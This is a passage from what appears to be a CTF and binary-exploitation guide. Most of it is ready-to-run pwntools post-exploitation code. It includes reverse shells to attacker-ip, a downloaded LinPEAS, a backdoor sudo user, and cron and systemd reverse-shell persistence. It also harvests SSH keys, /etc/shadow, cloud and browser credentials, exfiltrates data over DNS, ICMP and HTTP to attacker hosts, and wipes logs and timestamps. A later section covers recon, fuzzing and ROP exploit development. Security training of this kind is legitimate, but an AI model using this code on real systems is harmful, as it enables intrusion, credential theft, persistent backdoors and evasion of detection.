    # Format string partial overwrite
    # Change exit@got to main (same page)
    target = elf.got['exit']
    value = elf.symbols['main'] & 0xff  # Last byte only
    
    payload = fmtstr_payload(6, {target: value}, write_size='byte')
    io.sendline(payload)
    
    # Now exit() calls main instead - infinite loop
    log.success('Partial overwrite complete')
    return io

def stage2_full_exploit(io):
    """Now exploit with multiple attempts"""
    # Can try exploitation multiple times
    for attempt in range(100):
        try:
            # Full exploitation here
            pass
        except:
            continue  # Loop back to main via exit

io = stage1_partial_overwrite()
stage2_full_exploit(io)
```

---

## Post-exploitation Techniques

### Shell Stabilization

**Python TTY Shell**:

```python
# In reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z to background

# In local terminal
stty raw -echo; fg
# Press Enter twice

# In remote shell
export TERM=xterm
export SHELL=/bin/bash
stty rows 50 columns 200
```

**Script-based Stabilization**:

```bash
#!/bin/bash
# stabilize.sh
script /dev/null -c bash
# Or
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker:4444
```

**pwntools Shell Wrapper**:

```python
def get_stable_shell(io):
    """Upgrade to interactive shell"""
    io.sendline(b'python3 -c "import pty; pty.spawn(\'/bin/bash\')"')
    io.sendline(b'export TERM=xterm')
    io.sendline(b'stty rows 50 columns 200')
    
    # Set terminal to raw mode
    io.interactive()
```

### File Exfiltration

**Binary-safe Exfiltration**:

```python
def exfiltrate_file(io, remote_path, local_path):
    """Download file from compromised system"""
    # Base64 encode to handle binary data
    io.sendline(f'base64 {remote_path}'.encode())
    
    encoded = b''
    while True:
        line = io.recvline()
        if b'$' in line or b'#' in line:  # Shell prompt
            break
        encoded += line.strip()
    
    # Decode and save
    import base64
    data = base64.b64decode(encoded)
    
    with open(local_path, 'wb') as f:
        f.write(data)
    
    log.success(f'Exfiltrated {len(data)} bytes to {local_path}')

# Usage
exfiltrate_file(io, '/home/user/flag.txt', './flag.txt')
```

**Chunked Transfer**:

```python
def chunked_exfil(io, filepath, chunk_size=1024):
    """Exfiltrate large file in chunks"""
    io.sendline(f'wc -c {filepath}'.encode())
    size = int(io.recvline().split()[0])
    
    log.info(f'File size: {size} bytes')
    
    data = b''
    for offset in range(0, size, chunk_size):
        # Read chunk with dd
        cmd = f'dd if={filepath} bs=1 skip={offset} count={chunk_size} 2>/dev/null | base64'
        io.sendline(cmd.encode())
        
        chunk_b64 = io.recvline().strip()
        chunk = base64.b64decode(chunk_b64)
        data += chunk
        
        log.info(f'Progress: {len(data)}/{size}')
    
    return data
```

**Hex Dump Method**:

```bash
# In compromised shell
xxd -p flag.txt | tr -d '\n'

# In exploit script
io.sendline(b'xxd -p flag.txt | tr -d "\\n"')
hex_data = io.recvline().strip()
data = bytes.fromhex(hex_data.decode())
```

### Privilege Escalation Enumeration

**Automated Enumeration**:

```python
def enumerate_system(io):
    """Gather system information"""
    checks = {
        'kernel': 'uname -a',
        'sudo': 'sudo -l',
        'suid': 'find / -perm -4000 2>/dev/null',
        'capabilities': 'getcap -r / 2>/dev/null',
        'cron': 'cat /etc/crontab',
        'writable': 'find / -writable -type d 2>/dev/null',
    }
    
    results = {}
    for name, cmd in checks.items():
        io.sendline(cmd.encode())
        output = io.recvuntil(b'$', timeout=10)
        results[name] = output.decode('utf-8', errors='ignore')
        log.info(f'Checked: {name}')
    
    return results

# Parse results for interesting finds
def analyze_results(results):
    if 'NOPASSWD' in results['sudo']:
        log.success('Passwordless sudo found!')
    
    if 'docker' in results['groups']:
        log.success('User in docker group!')
    
    # Check for GTFOBins candidates
    suid_bins = results['suid'].split('\n')
    interesting = ['vim', 'nano', 'find', 'python', 'perl']
    for binary in suid_bins:
        if any(i in binary for i in interesting):
            log.success(f'Interesting SUID: {binary}')
```

**LinPEAS Integration**:

```python
def run_linpeas(io):
    """Upload and run LinPEAS"""
    # Host LinPEAS locally
    # python3 -m http.server 8000
    
    io.sendline(b'wget http://attacker-ip:8000/linpeas.sh -O /tmp/lp.sh')
    io.sendline(b'chmod +x /tmp/lp.sh')
    io.sendline(b'/tmp/lp.sh | tee /tmp/linpeas_output.txt')
    
    # Wait for completion
    io.recvuntil(b'LinPEAS done', timeout=300)
    
    # Exfiltrate results
    io.sendline(b'cat /tmp/linpeas_output.txt')
    results = io.recvuntil(b'$')
    
    return results
```

### Pivoting and Lateral Movement

**SSH Tunnel Setup**:

```python
def setup_pivot(io):
    """Create SSH tunnel for pivoting"""
    # Generate SSH key on compromised host
    io.sendline(b'ssh-keygen -t rsa -N "" -f /tmp/pivot_key')
    io.sendline(b'cat /tmp/pivot_key')
    
    private_key = extract_between(io.recvuntil(b'$'), b'-----BEGIN', b'-----END')
    
    # Save locally
    with open('pivot_key', 'wb') as f:
        f.write(private_key)
    os.chmod('pivot_key', 0o600)
    
    # Setup dynamic tunnel
    log.info('Starting SSH tunnel')
    tunnel = ssh('user', 'compromised-host', keyfile='pivot_key')
    tunnel.set_working_directory('/tmp')

	# Create dynamic SOCKS proxy
	# ssh -D 9050 -N -f user@compromised-host
	tunnel.run('echo "SOCKS proxy on port 9050"')
	
	return tunnel

def access_internal_network(tunnel): 
	"""Access internal network through pivot""" 
	# Configure proxychains 
	proxychains_conf = """ [ProxyList] socks5 127.0.0.1 9050 """

	with open('/etc/proxychains.conf', 'w') as f:
	    f.write(proxychains_conf)
	
	# Access internal host through proxy
	context.proxy = (socks.SOCKS5, 'localhost', 9050)
	io_internal = remote('10.10.10.5', 1337)  # Internal target
	
	return io_internal
````

**Port Forwarding**:
```python
def forward_port(io, remote_port, local_port):
    """Forward remote port to local machine"""
    # Method 1: socat
    io.sendline(f'socat TCP-LISTEN:{remote_port},reuseaddr,fork TCP:localhost:{local_port} &'.encode())
    
    # Method 2: SSH remote port forward
    # ssh -R remote_port:localhost:local_port user@attacker
    
    # Method 3: Using Python on compromised host
    forward_script = f"""
import socket
import threading

def forward(source, destination):
    while True:
        data = source.recv(4096)
        if not data: break
        destination.send(data)

def server():
    s = socket.socket()
    s.bind(('0.0.0.0', {remote_port}))
    s.listen(5)
    while True:
        client, addr = s.accept()
        target = socket.socket()
        target.connect(('localhost', {local_port}))
        threading.Thread(target=forward, args=(client, target)).start()
        threading.Thread(target=forward, args=(target, client)).start()

server()
"""
    
    io.sendline(b'python3 << EOF')
    io.sendline(forward_script.encode())
    io.sendline(b'EOF')
    
    log.success(f'Port {remote_port} forwarded to {local_port}')
````

### Persistence Mechanisms

**Backdoor User Creation**:

```python
def create_backdoor_user(io):
    """Add persistent backdoor user"""
    # Generate password hash
    # mkpasswd -m sha-512 password
    
    io.sendline(b'useradd -m -s /bin/bash backdoor')
    io.sendline(b'echo "backdoor:password" | chpasswd')
    io.sendline(b'usermod -aG sudo backdoor')  # Add to sudo group
    
    # Add to sudoers without password
    io.sendline(b'echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers')
    
    log.success('Backdoor user created: backdoor:password')
```

**SSH Key Persistence**:

```python
def install_ssh_key(io, public_key):
    """Install SSH key for persistent access"""
    io.sendline(b'mkdir -p ~/.ssh')
    io.sendline(b'chmod 700 ~/.ssh')
    io.sendline(f'echo "{public_key}" >> ~/.ssh/authorized_keys'.encode())
    io.sendline(b'chmod 600 ~/.ssh/authorized_keys')
    
    log.success('SSH key installed')

# Generate key pair locally
from Crypto.PublicKey import RSA

key = RSA.generate(2048)
private_key = key.export_key()
public_key = key.publickey().export_key(format='OpenSSH')

install_ssh_key(io, public_key.decode())

# Save private key
with open('backdoor_key', 'wb') as f:
    f.write(private_key)
```

**Cron Job Backdoor**:

```python
def install_cron_backdoor(io, reverse_shell_cmd):
    """Install cron job for periodic callback"""
    cron_entry = f'*/5 * * * * {reverse_shell_cmd}'
    
    # Add to user crontab
    io.sendline(f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -'.encode())
    
    # Or system-wide
    io.sendline(f'echo "{cron_entry}" > /etc/cron.d/update'.encode())
    io.sendline(b'chmod 644 /etc/cron.d/update')
    
    log.success('Cron backdoor installed')

# Example reverse shell command
reverse_shell = 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'
install_cron_backdoor(io, reverse_shell)
```

**Systemd Service Persistence**:

```python
def install_systemd_service(io):
    """Create persistent systemd service"""
    service_content = """
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""
    
    io.sendline(b'cat > /etc/systemd/system/update.service << EOF')
    io.sendline(service_content.encode())
    io.sendline(b'EOF')
    
    io.sendline(b'systemctl daemon-reload')
    io.sendline(b'systemctl enable update.service')
    io.sendline(b'systemctl start update.service')
    
    log.success('Systemd service installed')
```

### Data Harvesting

**Credential Harvesting**:

```python
def harvest_credentials(io):
    """Extract credentials from common locations"""
    targets = [
        '/home/*/.bash_history',
        '/home/*/.ssh/id_rsa',
        '/home/*/.ssh/id_rsa.pub',
        '/home/*/.ssh/known_hosts',
        '/etc/shadow',
        '/var/log/auth.log',
        '/root/.mysql_history',
        '/home/*/.docker/config.json',
        '/home/*/.aws/credentials',
    ]
    
    credentials = {}
    
    for target in targets:
        io.sendline(f'cat {target} 2>/dev/null | base64'.encode())
        io.recvuntil(b'$')
        output = io.recvuntil(b'$')
        
        try:
            data = base64.b64decode(output.split(b'\n')[0])
            if data:
                credentials[target] = data
                log.success(f'Found: {target}')
        except:
            pass
    
    return credentials

def extract_ssh_keys(credentials):
    """Parse SSH private keys from harvested data"""
    keys = []
    
    for path, data in credentials.items():
        if b'BEGIN' in data and b'PRIVATE KEY' in data:
            keys.append({
                'path': path,
                'key': data
            })
            
            # Save to file
            filename = path.replace('/', '_')
            with open(f'harvested_{filename}', 'wb') as f:
                f.write(data)
    
    return keys
```

**Browser Data Extraction**:

```python
def steal_browser_data(io):
    """Extract browser cookies and saved passwords"""
    # Firefox
    firefox_paths = [
        '/home/*/.mozilla/firefox/*/cookies.sqlite',
        '/home/*/.mozilla/firefox/*/logins.json',
    ]
    
    # Chrome
    chrome_paths = [
        '/home/*/.config/google-chrome/Default/Cookies',
        '/home/*/.config/google-chrome/Default/Login Data',
    ]
    
    for path in firefox_paths + chrome_paths:
        io.sendline(f'find / -path "{path}" 2>/dev/null'.encode())
        files = io.recvuntil(b'$').split(b'\n')
        
        for file in files:
            if file.strip():
                exfiltrate_file(io, file.decode().strip(), f'./loot/{file.decode().split("/")[-1]}')
```

**Memory Dumping**:

```python
def dump_process_memory(io, pid):
    """Dump memory of running process"""
    # Check if we can access process memory
    io.sendline(f'ls -la /proc/{pid}/mem'.encode())
    
    if b'Permission denied' not in io.recvline():
        # Dump using gdb
        io.sendline(f'gdb -p {pid} -batch -ex "generate-core-file /tmp/dump_{pid}" -ex quit'.encode())
        io.recvuntil(b'$', timeout=30)
        
        # Exfiltrate core dump
        exfiltrate_file(io, f'/tmp/dump_{pid}', f'./dump_{pid}')
        
        log.success(f'Dumped memory of PID {pid}')
    else:
        log.warning('Insufficient permissions for memory dump')
```

### Anti-forensics

**Log Cleaning**:

```python
def clean_logs(io):
    """Remove traces from system logs"""
    # Clear command history
    io.sendline(b'history -c')
    io.sendline(b'echo "" > ~/.bash_history')
    io.sendline(b'ln -sf /dev/null ~/.bash_history')
    
    # Clear system logs (requires root)
    logs_to_clean = [
        '/var/log/auth.log',
        '/var/log/syslog',
        '/var/log/wtmp',
        '/var/log/btmp',
        '/var/log/lastlog',
    ]
    
    for log in logs_to_clean:
        io.sendline(f'echo "" > {log}'.encode())
    
    # Remove specific entries (more stealthy)
    io.sendline(b'sed -i "/attacker-ip/d" /var/log/auth.log')
    
    log.success('Logs cleaned')
```

**Timestamp Manipulation**:

```python
def manipulate_timestamps(io, filepath):
    """Change file timestamps to avoid detection"""
    # Get reference timestamp from system file
    io.sendline(b'stat -c %y /bin/ls')
    ref_time = io.recvline().strip()
    
    # Apply to our file
    io.sendline(f'touch -d "{ref_time.decode()}" {filepath}'.encode())
    
    log.success(f'Timestamp manipulated for {filepath}')
```

**Process Hiding** [Inference - effectiveness varies by system]:

```python
def hide_process(io):
    """Attempt to hide malicious process"""
    # Method 1: Rename process to look legitimate
    io.sendline(b'exec -a "[kworker/0:0]" /tmp/backdoor &')
    
    # Method 2: Use LD_PRELOAD to hide from ps
    # Requires custom .so library [Unverified complexity in CTF]
    
    # Method 3: Run in memory only
    mem_exec = """
python3 -c "
import ctypes
import mmap

# Shellcode in memory
code = b'\\x48\\x31\\xf6...'  # Your payload
mem = mmap.mmap(-1, len(code), mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
mem.write(code)
ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_char.from_buffer(mem)))()
"
"""
    io.sendline(mem_exec.encode())
```

### Network Exfiltration Techniques

**DNS Exfiltration**:

```python
def exfil_via_dns(data, domain='attacker.com'):
    """Exfiltrate data via DNS queries"""
    import base64
    
    # Encode data
    encoded = base64.b32encode(data).decode().lower()
    
    # Split into chunks (DNS labels max 63 chars)
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    
    # Send as DNS queries
    for i, chunk in enumerate(chunks):
        query = f'{i}.{chunk}.{domain}'
        os.system(f'nslookup {query} >/dev/null 2>&1')
    
    log.success(f'Exfiltrated {len(data)} bytes via DNS')

# In exploit
io.sendline(b'cat flag.txt | python3 -c "import sys,base64; d=base64.b32encode(sys.stdin.buffer.read()).decode(); [__import__(\'os\').system(f\'nslookup {i}.{d[i:i+63]}.attacker.com\') for i in range(0,len(d),63)]"')
```

**ICMP Exfiltration**:

```python
def exfil_via_icmp(io, filepath):
    """Exfiltrate data in ICMP packets"""
    exfil_script = f"""
import subprocess
import base64

with open('{filepath}', 'rb') as f:
    data = f.read()

# Encode and chunk
encoded = base64.b64encode(data)
chunks = [encoded[i:i+32] for i in range(0, len(encoded), 32)]

for chunk in chunks:
    # Send in ICMP payload
    subprocess.run(['ping', '-c', '1', '-p', chunk.hex(), 'attacker-ip'])
"""
    
    io.sendline(b'python3 << EOF')
    io.sendline(exfil_script.encode())
    io.sendline(b'EOF')

# Capture on attacker machine:
# tcpdump -i eth0 -n icmp -X
```

**HTTP POST Exfiltration**:

```python
def exfil_via_http(io, filepath):
    """Exfiltrate via HTTP POST"""
    io.sendline(f'curl -X POST -d @{filepath} http://attacker-ip:8000/upload'.encode())
    
    # Or with auth bypass
    io.sendline(f'curl -X POST -H "Content-Type: application/octet-stream" --data-binary @{filepath} http://attacker-ip:8000/'.encode())

# Receiver server:
# python3 -m http.server 8000
# Or use:
# nc -lvnp 8000 > exfiltrated_data
```

### Covering Tracks in CTF

**Minimal Footprint Exploitation**:

```python
def stealthy_exploit():
    """Minimize logs and artifacts"""
    io = remote('target', 1337)
    
    # Use in-memory only payloads
    shellcode = asm(shellcraft.sh())
    
    # Avoid writing to disk
    payload = flat(
        b'A' * offset,
        shellcode
    )
    
    io.send(payload)
    
    # Execute commands without bash history
    io.sendline(b'unset HISTFILE')
    io.sendline(b'cat flag.txt')
    flag = io.recvline()
    
    # Exit cleanly without crash
    io.sendline(b'exit')
    io.close()
    
    return flag
```

**Session Cleanup**:

```python
def cleanup_session(io):
    """Clean up before disconnect"""
    cleanup_commands = [
        'rm -f /tmp/*',
        'history -c',
        'echo "" > ~/.bash_history',
        'pkill -9 -f "backdoor"',
        'rm -f ~/.ssh/authorized_keys_backup'
    ]
    
    for cmd in cleanup_commands:
        io.sendline(cmd.encode())
        io.recvuntil(b'$', timeout=2)
    
    log.info('Session cleaned up')
```

### Advanced Post-exploitation Automation

**Automated Looting Script**:

```python
#!/usr/bin/env python3
from pwn import *
import json

class PostExploitFramework:
    def __init__(self, io):
        self.io = io
        self.loot = {}
    
    def run_all(self):
        """Execute all post-exploitation modules"""
        self.enumerate()
        self.harvest_creds()
        self.establish_persistence()
        self.cleanup()
        self.save_loot()
    
    def enumerate(self):
        """System enumeration"""
        log.info('Enumerating system...')
        
        commands = {
            'hostname': 'hostname',
            'whoami': 'whoami',
            'id': 'id',
            'uname': 'uname -a',
            'network': 'ip addr',
        }
        
        for name, cmd in commands.items():
            self.io.sendline(cmd.encode())
            self.loot[name] = self.io.recvuntil(b'$').decode('utf-8', errors='ignore')
    
    def harvest_creds(self):
        """Credential harvesting"""
        log.info('Harvesting credentials...')
        
        # Check for SSH keys
        self.io.sendline(b'find ~/.ssh -type f 2>/dev/null')
        keys = self.io.recvuntil(b'$')
        self.loot['ssh_keys'] = keys
        
        # Check for config files
        configs = [
            '~/.aws/credentials',
            '~/.docker/config.json',
            '~/.gitconfig'
        ]
        
        for config in configs:
            self.io.sendline(f'cat {config} 2>/dev/null | base64'.encode())
            data = self.io.recvuntil(b'$')
            try:
                self.loot[config] = base64.b64decode(data.split(b'\n')[0])
            except:
                pass
    
    def establish_persistence(self):
        """Install persistence mechanisms"""
        log.info('Establishing persistence...')
        
        # SSH key method
        pubkey = "ssh-rsa AAAAB3NzaC1yc... backdoor@attacker"
        self.io.sendline(b'mkdir -p ~/.ssh')
        self.io.sendline(f'echo "{pubkey}" >> ~/.ssh/authorized_keys'.encode())
        
        self.loot['persistence'] = 'SSH key installed'
    
    def cleanup(self):
        """Clean tracks"""
        log.info('Cleaning tracks...')
        self.io.sendline(b'history -c')
    
    def save_loot(self):
        """Save collected data"""
        with open('loot.json', 'w') as f:
            json.dump(self.loot, f, indent=2, default=str)
        
        log.success(f'Loot saved: {len(self.loot)} items')

# Usage
io = remote('target', 1337)
# ... exploitation ...
framework = PostExploitFramework(io)
framework.run_all()
```

### Container Escape Post-exploitation

**Docker Escape Detection and Exploitation**:

```python
def detect_container(io):
    """Detect if running in container"""
    checks = {
        'docker': 'ls -la /.dockerenv',
        'cgroup': 'cat /proc/1/cgroup | grep docker',
        'hostname': 'hostname',
    }
    
    in_container = False
    for name, cmd in checks.items():
        io.sendline(cmd.encode())
        output = io.recvuntil(b'$')
        if name == 'docker' and b'No such file' not in output:
            in_container = True
        elif name == 'cgroup' and b'docker' in output:
            in_container = True
    
    return in_container

def attempt_docker_escape(io):
    """Attempt container escape techniques"""
    log.info('Attempting Docker escape...')
    
    # Method 1: Mounted docker.sock
    io.sendline(b'ls -la /var/run/docker.sock')
    if b'No such file' not in io.recvline():
        log.success('docker.sock accessible!')
        
        # Create privileged container
        escape_cmd = '''docker run -v /:/host -it ubuntu chroot /host bash'''
        io.sendline(escape_cmd.encode())
        log.success('Escaped via docker.sock')
        return True
    
    # Method 2: Check capabilities
    io.sendline(b'capsh --print')
    caps = io.recvuntil(b'$')
    if b'cap_sys_admin' in caps:
        log.success('CAP_SYS_ADMIN available!')
        # Exploit with this capability [Inference]
        return True
    
    return False
```

---

## Related Topics

**Essential Prerequisites**:

- Binary Exploitation Fundamentals
- Linux System Internals
- Network Protocol Analysis
- Shellcode Development

**Advanced Topics**:

- Kernel Exploitation Post-compromise
- Windows Post-exploitation Techniques
- Cloud Environment Pivoting (AWS/GCP/Azure)
- Active Directory Lateral Movement
- Advanced Persistence Mechanisms (Rootkits, Bootkits)

**Tool Mastery**:

- Metasploit Post-exploitation Modules
- Empire/Covenant C2 Frameworks
- Custom Payload Development
- Covert Channel Communication

**Defensive Awareness**:

- Detection Evasion Techniques
- EDR/AV Bypass Methods
- Log Analysis and SIEM Evasion
- Incident Response Countermeasures

---

# Practical Methodology

## Vulnerability Identification Workflow

Systematic vulnerability discovery requires structured analysis combining static and dynamic techniques. This workflow applies to CTF binaries and real-world targets.

### Initial Reconnaissance

**Binary Information Gathering:**

```bash
# File type and architecture
file ./binary
# Output: ELF 64-bit LSB executable, x86-64

# Security mechanisms
checksec --file=./binary
# or
pwn checksec ./binary

# Key protections to identify:
# - RELRO: Full/Partial/None (GOT overwrite difficulty)
# - Stack: Canary found/No canary (stack overflow detection)
# - NX: NX enabled/disabled (code execution on stack)
# - PIE: PIE enabled/No PIE (address randomization)
# - FORTIFY: Yes/No (hardened libc functions)
```

**Library Dependencies:**

```bash
# Identify linked libraries
ldd ./binary
# Output shows libc version, ld-linux, other dependencies

# Extract libc for local testing
cp /lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
cp /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 ./ld.so.2

# Run with specific libc (bypass version mismatches)
./ld.so.2 --library-path . ./binary
```

**String Analysis:**

```bash
# Extract readable strings
strings ./binary | less

# Look for:
# - Function names (debugging symbols)
# - Format strings ("%s", "%d", "%p")
# - File paths (/bin/sh, /flag.txt)
# - Error messages (indicate code paths)
# - Unusual patterns (encoding, crypto keys)

# Filter for specific patterns
strings ./binary | grep -E "flag|pass|admin|debug"

# Wide character strings (UTF-16)
strings -e l ./binary
```

**Symbol Analysis:**

```bash
# List symbols (non-stripped binaries)
nm ./binary | less

# Identify interesting functions
nm ./binary | grep -i "admin\|secret\|debug\|win"

# Dynamic symbols (GOT/PLT entries)
objdump -T ./binary

# Identify imported functions
readelf -s ./binary | grep UND
```

### Static Analysis

**Disassembly and Decompilation:**

```bash
# Disassemble with objdump
objdump -d ./binary -M intel > disasm.txt

# Full headers and sections
objdump -x ./binary > headers.txt

# Disassemble specific function
objdump -d ./binary -M intel --disassemble=main

# Using radare2
r2 ./binary
[0x00000000]> aaa      # Analyze all
[0x00000000]> afl      # List functions
[0x00000000]> pdf @main # Disassemble main
[0x00000000]> VV       # Visual graph mode
```

**Ghidra/IDA Workflow:**

```
1. Load binary and auto-analyze
2. Locate main() or entry point
3. Identify user input functions:
   - read(), fgets(), scanf(), gets()
   - recv(), recvfrom() (network)
   - Custom input handlers

4. Trace data flow from input to dangerous sinks:
   - strcpy(), sprintf(), strcat() (buffer overflow)
   - printf(), fprintf() with user format (format string)
   - system(), exec*() (command injection)
   - Pointer arithmetic without bounds checks

5. Examine custom functions for logic flaws
6. Check for win/backdoor functions
```

**Automated Vulnerability Scanning:**

```bash
# Pattern-based vulnerability detection (limited effectiveness)
# [Unverified] Tools may produce false positives

# Flawfinder (static C analysis)
flawfinder ./source.c

# ROPgadget exploration
ROPgadget --binary ./binary --depth 10

# One-gadget (RCE gadgets in libc)
one_gadget ./libc.so.6
# Shows addresses of single-call shell gadgets
```

### Dynamic Analysis

**Basic Execution Testing:**

```bash
# Run with standard input
echo "test input" | ./binary

# Interactive execution
./binary
# Provide various inputs, observe behavior

# Strace system call monitoring
strace ./binary 2>&1 | tee strace.log
# Reveals file operations, network calls, signal handling

# Ltrace library call monitoring
ltrace ./binary 2>&1 | tee ltrace.log
# Shows libc function calls with arguments
```

**Fuzzing for Crashes:**

```bash
# Simple mutation fuzzing
for i in {1..1000}; do
    python -c "print('A' * $i)" | ./binary
    if [ $? -ne 0 ]; then
        echo "Crash at length $i"
    fi
done

# Pattern-based fuzzing
python << 'EOF'
import subprocess
import string

payloads = [
    'A' * 100,
    'A' * 500,
    '%p' * 50,
    '%s' * 50,
    '%x' * 50,
    '%n' * 10,
    '\x00' * 100,
    '\xff' * 100,
]

for payload in payloads:
    try:
        p = subprocess.run(['./binary'], input=payload.encode(), 
                          timeout=1, capture_output=True)
        if p.returncode < 0:
            print(f"Crashed with: {payload[:50]}")
    except subprocess.TimeoutExpired:
        print(f"Timeout with: {payload[:50]}")
EOF
```

**GDB-based Crash Analysis:**

```bash
# Run until crash
gdb ./binary
gdb> r < crash_input.txt

# When segfault occurs
gdb> info registers
# Check RIP/PC - where crash occurred
# Check RSP - stack pointer state
# Check RDI, RSI, etc. - argument registers

gdb> x/20gx $rsp
# Examine stack contents

gdb> backtrace
# View call stack

gdb> info frame
# Current stack frame details
```

**Identifying Vulnerability Type:**

```
Crash indicators:

1. Stack Buffer Overflow:
   - RIP = 0x4141414141414141 (overwritten return address)
   - RSP points to controlled data
   - Pattern in stack shows overflow path

2. Format String:
   - Crash in printf/fprintf internals
   - Invalid pointer dereference from %s
   - RIP controlled via %n writes

3. Heap Corruption:
   - Crash in malloc/free
   - "corrupted size vs. prev_size"
   - "double free or corruption"

4. Use-After-Free:
   - Access to unmapped memory
   - Crash in object method call
   - Heap address in freed state

5. Integer Overflow:
   - Unexpectedly small allocation
   - Negative array index
   - Wrap-around calculation
```

## Exploit Development Lifecycle

Structured approach from vulnerability to working exploit.

### Phase 1: Vulnerability Validation

**Confirm Exploitability:**

```python
from pwn import *

# Test 1: Confirm crash with controlled input
p = process('./binary')
p.sendline(b'A' * 200)
try:
    p.recvline(timeout=1)
except EOFError:
    log.success("Process crashed - vulnerability confirmed")

# Test 2: Pattern-based control verification
pattern = cyclic(300)  # De Bruijn sequence
p = process('./binary')
p.sendline(pattern)
p.wait()

# Check core dump
core = Coredump('./core')
fault_addr = core.fault_addr
offset = cyclic_find(fault_addr)
log.info(f"Offset to crash: {offset}")
```

**Control Verification:**

```bash
# GDB with pattern
gdb ./binary
gdb> r < <(python -c 'from pwn import *; print(cyclic(300))')

# At crash
gdb> x/gx $rsp
# Output: 0x6161616c6161616b

# Find offset
python3 -c 'from pwn import *; print(cyclic_find(0x6161616c6161616b))'
# Output: 72
```

### Phase 2: Constraint Analysis

**Identify Exploit Constraints:**

```python
# Constraint checklist:

# 1. Input length limits
max_input = 256  # From buffer size analysis

# 2. Bad characters (null bytes, newlines)
bad_chars = [b'\x00', b'\x0a', b'\x0d']

# 3. Stack canaries
if 'Canary' in checksec('./binary'):
    log.warning("Stack canary present - must leak first")

# 4. ASLR/PIE
if 'PIE' in checksec('./binary'):
    log.warning("PIE enabled - need code leak")

# 5. Available gadgets/functions
rop = ROP('./binary')
log.info(f"ROP gadgets available: {len(rop.gadgets)}")

# 6. NX implications
if 'NX enabled' in checksec('./binary'):
    log.info("NX enabled - shellcode on stack not viable, use ROP")
```

**Bad Character Detection:**

```python
from pwn import *

# Test all bytes
test_chars = bytes(range(256))

p = process('./binary')
p.sendline(test_chars)
received = p.recv()

# Compare sent vs received
bad_chars = []
for i, (sent, recv) in enumerate(zip(test_chars, received)):
    if sent != recv:
        bad_chars.append(hex(sent))

log.info(f"Bad characters: {bad_chars}")
```

### Phase 3: Primitive Development

**Building Basic Primitives:**

```python
from pwn import *

context.binary = './binary'
elf = ELF('./binary')

# Primitive 1: Controlled overflow
def overflow(offset, payload):
    p = process('./binary')
    exploit = b'A' * offset + payload
    p.sendline(exploit)
    return p

# Primitive 2: Information leak
def leak_stack():
    p = process('./binary')
    p.sendline(b'%p.' * 20)
    leaks = p.recvline().decode().split('.')
    return [int(x, 16) for x in leaks if x.startswith('0x')]

# Primitive 3: Arbitrary read
def read_addr(addr):
    p = process('./binary')
    payload = b'%7$s||||' + p64(addr)
    p.sendline(payload)
    data = p.recvuntil(b'||||')
    return data[:-4]

# Test primitives
log.info("Testing leak primitive...")
leaked = leak_stack()
log.success(f"Leaked {len(leaked)} addresses")
```

### Phase 4: Exploit Construction

**Multi-stage Exploit Pattern:**

```python
from pwn import *

context.binary = './binary'
context.log_level = 'debug'

elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

def exploit():
    if args.REMOTE:
        p = remote('target.com', 1337)
    else:
        p = process('./binary')
    
    # Stage 1: Leak addresses
    log.info("Stage 1: Information leak")
    p.recvuntil(b'> ')
    p.sendline(b'%3$p')  # Leak stack
    stack_leak = int(p.recvline().strip(), 16)
    log.success(f"Stack leak: {hex(stack_leak)}")
    
    # Calculate base addresses
    stack_base = stack_leak & ~0xfff  # [Inference] Page-aligned
    
    # Stage 2: Leak libc
    p.recvuntil(b'> ')
    p.sendline(b'%13$s||||' + p64(elf.got['puts']))
    libc_leak = u64(p.recvuntil(b'||||')[:-4].ljust(8, b'\x00'))
    libc.address = libc_leak - libc.symbols['puts']
    log.success(f"libc base: {hex(libc.address)}")
    
    # Stage 3: Execute payload
    log.info("Stage 3: ROP chain execution")
    
    offset = 72
    rop_chain = flat([
        rop.rdi.address,
        next(libc.search(b'/bin/sh')),
        libc.symbols['system']
    ])
    
    payload = b'A' * offset + rop_chain
    p.sendline(payload)
    
    # Interact with shell
    p.interactive()

if __name__ == '__main__':
    exploit()
```

### Phase 5: Reliability Improvement

**Debugging and Stabilization:**

```python
# Add error handling
def safe_recv(p, timeout=1):
    try:
        return p.recvline(timeout=timeout)
    except EOFError:
        log.error("Process died unexpectedly")
        return None

# Validate leaks
def validate_leak(addr):
    # [Inference] x86-64 userspace addresses typically start with 0x7f or 0x55
    if (addr & 0x7f0000000000) in [0x7f0000000000, 0x550000000000]:
        return True
    log.warning(f"Invalid leak: {hex(addr)}")
    return False

# Retry logic
def exploit_with_retry(max_attempts=10):
    for attempt in range(max_attempts):
        try:
            log.info(f"Attempt {attempt + 1}/{max_attempts}")
            return exploit()
        except Exception as e:
            log.warning(f"Attempt failed: {e}")
            if attempt == max_attempts - 1:
                log.error("All attempts failed")
                raise
            sleep(1)
```

## Offset Calculation Techniques

Precise offset calculation is critical for exploit reliability.

### Pattern-Based Offset Finding

**Using pwntools Cyclic:**

```python
from pwn import *

# Generate unique pattern
pattern_length = 500
pattern = cyclic(pattern_length)

# Write to file for GDB
with open('pattern.txt', 'wb') as f:
    f.write(pattern)

# Run in GDB
'''
gdb ./binary
gdb> r < pattern.txt
# At crash, note value in RIP
gdb> x/gx $rsp
'''

# Calculate offset programmatically
p = process('./binary')
p.sendline(pattern)
p.wait()

core = Coredump('./core')
crash_value = core.read(core.rsp, 8)
offset = cyclic_find(crash_value)

log.success(f"Offset to RIP: {offset}")
```

**Manual Pattern Method:**

```bash
# Create unique pattern
python3 << 'EOF'
import string
pattern = ""
for a in string.ascii_uppercase:
    for b in string.ascii_uppercase:
        for c in string.ascii_uppercase:
            pattern += a + b + c
            if len(pattern) >= 300:
                print(pattern)
                exit()
EOF

